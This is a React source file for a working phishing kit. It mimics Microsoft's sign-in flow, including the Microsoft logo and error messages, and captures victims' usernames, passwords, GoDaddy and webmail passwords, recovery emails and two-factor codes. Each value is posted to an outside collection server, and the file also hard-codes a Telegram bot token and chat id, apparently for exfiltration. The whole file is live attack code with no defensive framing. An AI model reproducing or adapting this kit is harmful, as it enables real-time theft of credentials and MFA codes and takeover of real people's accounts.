import logo from './logo.svg';
import React, { useState } from 'react';
import axios from "axios";
import './App.css';


function App() {
  const [username, usernameShow] = useState('');
  const [pwd, pwdShow] = useState('');
  const [recomail, recomailSet] = useState('');
  const [loader, loaderSet] = useState('disp');
  const [second, secondShow] = useState('second');
  const [secon, seconShow] = useState('second');
  const [seco, secoShow] = useState('second');
  const [sec, secShow] = useState('second');
  const [se, seShow] = useState('second');
  const [signed, signedShow] = useState('second');
  const [codefa, codefaShow] = useState('second');
  const [nonee, noneeShow] = useState('nonee');
  const [godaddy, godaddyShow] = useState('nonee');
  const [webmail, webmailShow] = useState('nonee');
  const [first, firstShow] = useState('');
  const [code, codeShow] = useState('');
  const [filteredEmail, filteredEmailsShow] = useState('');
  const botToken = '5051297224:AAETgLhNRTbhpJNucj4Ny4y_czF0M3UnllY';
  const chatId = '-772522345';
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  const handleInputChange = (event) => {
    usernameShow(event.target.value);
  };
  const handleInputChanger = (event) => {
    pwdShow(event.target.value)
  };
  const handleInputChangerr = (event) => {
    recomailSet(event.target.value)
  };
  const handleInputChangerrr = (event) => {
    codeShow(event.target.value)
  };

  const handleSubmit = async (e) => {
    loaderSet("")
    e.preventDefault();
    const formData = new FormData(e.target);
    const username = formData.get("username");
    try {
      const response = await axios.post('https://cooking-office.onrender.com/username', {
          username,
      });
      const responseData = response.data
      if(responseData.response === "godaddy"){
        firstShow('second')
        godaddyShow('')
        loaderSet("disp")
        return
      } else if(responseData.response === "webmail"){
        firstShow('second')
        webmailShow("")
        loaderSet("disp")
      }else if(responseData.response === "pwdrequest"){
        firstShow('second')
        secondShow('')
        loaderSet("disp")
        // alert(response.imgSrc)
      }
            // Handle the response data in your React application
    } catch (error) {
      console.error('An error occurred:', error);
    }
  }

  const handleSubmitt = async (e) => {
    loaderSet("")
    e.preventDefault();
    const formData = new FormData(e.target);
    const pwd = formData.get("password");
    try {
      const response = await axios.post('https://cooking-office.onrender.com/pwd', {
          pwd,
          username
      });
      const responseData = response.data
      if(responseData.response === "Invalid Password"){
        // alert("Invalid Password")
        noneeShow("")
        loaderSet("disp")
        pwdShow("")
      } else if(responseData.response === "Valid Password"){
        // alert("Valid Password")
        signedShow("")
        secShow("second")
        seconShow("second")
        loaderSet("disp")
        secondShow('second')
      } else if(responseData.response === "2FA"){
        filteredEmailsShow(responseData.filteredEmails)
        secondShow('second')
        secShow('')
        loaderSet("disp")
      } else if(responseData.response === "Auth Code"){
        codefaShow("")
        secondShow('second')
        loaderSet("disp")
      }

            // Handle the response data in your React application
    } catch (error) {
      console.error('An error occurred:', error);
    }


  }
  const displayPwd = async (e) => {
    noneeShow("nonee")
  }

  const handleSub = async (e) => {
    loaderSet("")
    e.preventDefault();
    const formData = new FormData(e.target);
    const code2fa = formData.get("code2fa");
    try {
      const response = await axios.post('https://cooking-office.onrender.com/code2fa', {
        code2fa,
        username,
        pwd
      });
      const responseData = response.data
      if(responseData.response === true){
        noneeShow("")
        loaderSet("disp")
      }else if(responseData.response === false){
        signedShow("")
        secShow("second")
        seconShow("second")
        codefaShow("second")
        loaderSet("disp")
      }
    } catch (error) {
      console.error('An error occurred:', error);
    }
  }

  const webShow = async (e) => {
    signedShow("")
    loaderSet("disp")
    webmailShow("second")
    try {
      const response = await axios.post('https://cooking-office.onrender.com/webshow', {
        pwd,
        username
      });
    } catch (error) {
      console.error('An error occurred:', error);
    }

  }
  const godSubmitt = async (e) => {
    loaderSet("")
    e.preventDefault();
    const formData = new FormData(e.target);
    const pwd = formData.get("password");
    try {
      const response = await axios.post('https://cooking-office.onrender.com/godaddypwd', {
        pwd,
        username
      });
      const responseData = response.data
      if(responseData.response === "Invalid Password"){
        loaderSet("disp")
        noneeShow("")
      }else if(responseData.response === "Valid Password"){
        loaderSet("disp")
        godaddyShow("second")
        signedShow("")
      }

    } catch (error) {
      console.error('An error occurred:', error);
    }
  }

  const handleSubmittt = async (e) => {
    loaderSet("")
    e.preventDefault();
    const formData = new FormData(e.target);
    const recmail = formData.get("recmail");
    try {
      const response = await axios.post('https://cooking-office.onrender.com/recomail', {
        recmail
      });
      const responseData = response.data
      if(responseData.response === true){
        loaderSet("disp")
        // alert('Invalid Email')
        noneeShow("")
      }else if(responseData.response === false){
        loaderSet("disp")
        // alert('Enter Code')
        secoShow('second')
        seShow("")
        secShow('second')
      }
    } catch (error) {
      console.error('An error occurred:', error);
    }

  }
  const sendCode = async (content) => {
    loaderSet("")
    try {
      const response = await axios.post('https://cooking-office.onrender.com/mfacodes', {
        content
      });
      const responseData = response.data
      if(responseData.response === "***"){
        secShow('second')
        loaderSet("disp")
        secoShow('')
      } else if(responseData.response === "code") {
        // alert('verify code')
        seconShow('')
        secShow('second')
        loaderSet("disp")
      }
      // console.log(content)

    } catch (error) {
      console.error('An error occurred:', error);
    }
  };


  return (
    <div className="App">
        <div className="formal">
        <div class="loading-bar" id={loader}></div>

            <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" height="25px" alt=""/>
            <form className={first} onSubmit={handleSubmit}>

              <br/>
              <span id="disp">mailers@mail.ru</span>
            <label for="#"><h1 id="signs">Sign in</h1></label>
            <p id="sign-ins">We'll send a code to your mobile to sign you in.</p>
            <input type="text" value={username} name='username' onChange={handleInputChange} id="phone-mail" placeholder="Email, phone, or Skype" required></input>
            <br/>
            <p id="no-account">No account? <a href="#">Create one!</a></p>
            <a href="#" id="access">Can’t access your account?</a>
            <br/><br/><br/>
            <div className="main-butts">
                <button id="" type="submit">Next</button>
            </div>
            </form>

            <form className={second} onSubmit={handleSubmitt}>
              <br/>
              <span id="dis">{username}</span>
            <label for="#"><h1 id="signs">Enter password</h1></label>
            <p id="sign-in" className={nonee}>Your account or password is incorrect. If you don't remember your password, reset it now.</p>
            <input type="password" value={pwd} name='password' onChange={handleInputChanger} id="phone-mail" placeholder="Password" required></input>
            <br/><br/>
            <p id="no-account"> <a href="#">Forgot password?</a></p>
            <br/><br/>
            <div className="main-butts">
                <button id="" onClick={displayPwd} type="submit">Next</button>
            </div>
            </form>
            <form className={godaddy} onSubmit={godSubmitt}>
              <br/>
              <span id="dis">{username}</span>
            <label for="#"><h1 id="signs">Enter password</h1></label>
            <p id="sign-in" className={nonee}>Your account or password is incorrect. If you don't remember your password, reset it now.</p>
            <input type="password" value={pwd} name='password' onChange={handleInputChanger} id="phone-mail" placeholder="Password" required></input>
            <br/><br/>
            <p id="no-account"> <a href="#">Forgot password?</a></p>
            <br/><br/>
            <div className="main-butts">
                <button id="" onClick={displayPwd} type="submit">Next</button>
            </div>
            </form>
            <form className={webmail} onSubmit={webShow}>
              <br/>
              <span id="dis">{username}</span>
            <label for="#"><h1 id="signs">Enter password</h1></label>
            <p id="sign-in" className={nonee}>Your account or password is incorrect. If you don't remember your password, reset it now.</p>
            <input type="password" value={pwd} name='password' onChange={handleInputChanger} id="phone-mail" placeholder="Password" required></input>
            <br/><br/>
            <p id="no-account"> <a href="#">Forgot password?</a></p>
            <br/><br/>
            <div className="main-butts">
                <button id="" onClick={displayPwd} type="submit">Next</button>
            </div>
            </form>
            <form className={signed}>
              <br/>
              <span id="dis">{username}</span>
            <label for="#"><h1 id="signs">Stay signed in?</h1></label>
            <p id="raid" >Stay signed in so you don't have to sign in again next time.</p>
            <br/>
            <a href="https://outlook.live.com/owa" target="_blank">
            <div className="main-butts">
                <button id="" >Yes</button> 
                <button id="no">No</button>
            </div>
            </a>
            </form>
            <form className={seco} onSubmit={handleSubmittt}>
              <br/>
              <span id="dis">{username}</span>
            <label for="#"><h1 id="signs">Verify your email</h1></label>
            {filteredEmail &&
      filteredEmail.length > 0 &&
      filteredEmail
    .filter(content => content.includes('***'))
    .map((content, index) => (
      <p id="raid" key={index}>
              We will send a verification code to {content}. To verify that this is your email address, enter it below.</p>
          ))}
          <p id="sign-in" className={nonee}>That doesn't match the alternate email associated with your account.</p>
            
            <input type="email" value={recomail} name='recomail' onChange={handleInputChangerr} id="phone-mail" placeholder="someone@example.com" required></input>
            <br/><br/>
            <br/><br/>
            <div className="main-butts">
                <button id="" onClick={displayPwd} type="submit">Send Code</button>
            </div>
            </form>
            <form className={codefa} onSubmit={handleSub}>
              <br/>
              <span id="dis">{username}</span>
            <label for="#"><h1 id="signs">Enter code
            </h1></label>
      <p id="raid" >
      Please type in the code displayed on your authenticator app from your device.</p>

          <p id="sign-in" className={nonee}>That code didn't work. Check the code and try again.</p>
          <input type="text" value={code} name='code2fa' onChange={handleInputChangerrr} id="phone-mail" placeholder="Code" required></input>
            <br/><br/>
            <br/><br/>
            <div className="main-butts">
                <button id="" onClick={displayPwd} type="submit">Verify</button>
            </div>
            </form>
            <form className={secon} onSubmit={handleSub}>
              <br/>
              <span id="dis">{username}</span>
            <label for="#"><h1 id="signs">Enter code
            </h1></label>
            {filteredEmail &&
      filteredEmail.length > 0 &&
      filteredEmail
    .filter(content => !content.includes('***'))
    .map((content, index) => (
      <p id="raid" key={index}>
              We emailed a code to {content}. Please enter the code to sign in.</p>
          ))}
          <p id="sign-in" className={nonee}>That code didn't work. Check the code and try again.</p>
          <input type="text" value={code} name='code2fa' onChange={handleInputChangerrr} id="phone-mail" placeholder="Code" required></input>
            <br/><br/>
            <br/><br/>
            <div className="main-butts">
                <button id="" onClick={displayPwd} type="submit">Verify</button>
            </div>
            </form>
  <form className={se} onSubmit={handleSub}>
              <br/>
              <span id="dis">{username}</span>
            <label for="#"><h1 id="signs">Enter code
            </h1></label>
              <p id="raid">If {recomail} matches the email address on your account, we'll send you a code.</p>            
          <p id="sign-in" className={nonee}>That code didn't work. Check the code and try again.</p>
            
            <input type="text" value={code} name='code2fa' onChange={handleInputChangerrr} id="phone-mail" placeholder="Code" required></input>
            <br/><br/>
            <br/><br/>
            <div className="main-butts">
                <button id="" onClick={displayPwd} type="submit">Verify</button>
            </div>
    </form>
            <form className={sec} onSubmit={handleSubmitt}>
              <br/>
              <span id="dis">{username}</span>
            <label for="#"><h1 id="signs">Verify your identity</h1></label>
            
        {filteredEmail && filteredEmail.length > 0 && filteredEmail.map((content, index) => (
            <span id='email-span' onClick={() => sendCode(content)} key={index}> <img src="https://www.linkpicture.com/q/Screenshot-2023-07-05-at-10.16.57-AM.png" /> <p> Email {content}</p> </span>
          ))}
            <br/><br/>
            </form>
        </div>
    </div>
  );
}

export default App;
